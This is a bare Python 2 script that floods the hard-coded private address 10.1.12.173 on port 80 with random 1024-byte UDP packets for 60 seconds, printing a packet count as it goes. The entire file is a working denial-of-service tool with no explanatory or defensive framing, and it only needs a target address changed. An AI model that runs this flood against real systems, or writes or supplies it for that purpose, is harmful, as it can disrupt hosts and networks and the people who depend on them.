import socket 
import random
import time
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip='10.1.12.173'
port=80
sent=0 
st = time.time()
print 'success'
st = time.time()
while(1):
	end = time.time()
	if(end-st<60):
		sock.sendto(bytes,(ip,port))
		print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
		sent= sent + 1
	else:
		exit()
